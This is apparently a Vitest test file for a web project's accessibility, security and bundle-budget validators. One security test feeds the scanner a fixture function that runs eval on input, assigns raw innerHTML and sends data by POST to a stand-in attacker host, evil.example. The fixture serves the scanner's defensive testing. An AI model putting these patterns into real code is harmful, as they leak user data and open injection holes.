import { describe, expect, it } from 'vitest';
import type { ValidationIssue } from '../../src/types/tool';
import {
  inspectHtmlAccessibility,
  runAccessibilityValidation,
} from '../../scripts/validation/validate-accessibility';
import {
  inspectSourceSecurity,
  runSecurityValidation,
} from '../../scripts/validation/validate-security';
import { inspectDistPerformanceBudgets } from '../../scripts/tasks/performance';

describe('Phase 9 accessibility, security, and static bundle checks', () => {
  it('passes static accessibility validation against live AHADEX codebase and dist HTML', async () => {
    const report = await runAccessibilityValidation();
    expect(report.status).toBe('PASS');
    expect(report.checkedCount).toBeGreaterThanOrEqual(12);
    expect(report.issues).toEqual([]);
  });

  it('passes static security validation with zero unsafe primitives or outbound tool fetches', async () => {
    const report = await runSecurityValidation();
    expect(report.status).toBe('PASS');
    expect(report.issues).toEqual([]);
  });

  it('passes dist bundle performance budget audit without critical failures', () => {
    const report = inspectDistPerformanceBudgets();
    expect(report.issues.filter((i) => i.severity === 'critical')).toEqual([]);
    expect(report.checkedCount).toBeGreaterThanOrEqual(4);
  });
});

describe('Phase 9 defect rejection tests', () => {
  it('flags missing lang, skipped headings, unlabeled inputs, empty buttons, and missing alt', () => {
    const issues: ValidationIssue[] = [];
    inspectHtmlAccessibility(
      `<html><body>
        <main id="other">
          <h1>Title</h1>
          <h3>Skipped heading</h3>
          <img src="/logo.svg" />
          <button></button>
          <input type="text" />
          <a href="https://example.com" target="_blank">External</a>
        </main>
      </body></html>`,
      'fixture:bad-a11y',
      issues,
    );

    const codes = new Set(issues.map((i) => i.code));
    expect(codes.has('A11Y_MISSING_HTML_LANG')).toBe(true);
    expect(codes.has('A11Y_MISSING_MAIN_LANDMARK')).toBe(true);
    expect(codes.has('A11Y_HEADING_LEVEL_SKIPPED')).toBe(true);
    expect(codes.has('A11Y_IMG_MISSING_ALT')).toBe(true);
    expect(codes.has('A11Y_EMPTY_BUTTON')).toBe(true);
    expect(codes.has('A11Y_UNLABELED_CONTROL')).toBe(true);
    expect(codes.has('A11Y_TARGET_BLANK_NO_REL')).toBe(true);
  });

  it('rejects eval, raw innerHTML, non-JSON-LD dangerouslySetInnerHTML, and outbound fetch in tools', () => {
    const issues: ValidationIssue[] = [];
    inspectSourceSecurity(
      'src/tools/bad-tool/engine.ts',
      `
        export async function bad(data: string) {
          eval(data);
          document.body.innerHTML = data;
          await fetch('https://evil.example/upload', { method: 'POST', body: data });
          return <div dangerouslySetInnerHTML={{ __html: data }} />;
        }
      `,
      true,
      issues,
    );

    const codes = new Set(issues.map((i) => i.code));
    expect(codes.has('SEC_DYNAMIC_CODE_EXECUTION')).toBe(true);
    expect(codes.has('SEC_RAW_DOM_ASSIGNMENT')).toBe(true);
    expect(codes.has('SEC_TOOL_OUTBOUND_NETWORK')).toBe(true);
    expect(codes.has('SEC_DANGEROUS_HTML_INJECTION')).toBe(true);
  });
});
